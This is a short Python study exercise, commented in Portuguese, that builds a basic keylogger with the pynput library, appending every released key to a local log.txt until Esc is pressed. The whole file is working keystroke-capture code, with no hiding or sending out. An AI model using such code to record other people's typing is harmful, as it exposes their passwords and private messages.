"""
Exercicio estudando python

Criando um keylogger com python, utilizando a lib
pynput

"""
from pynput.keyboard import Listener, Key

def log(text):

    with open("log.txt", "a") as file_log:
        file_log.write(text)

def monitor(key):

    try:
        log(key.char)
    except AttributeError:
        log(str(key))
    if key == Key.esc:
        return False

with Listener(on_release=monitor) as l:
    l.join()
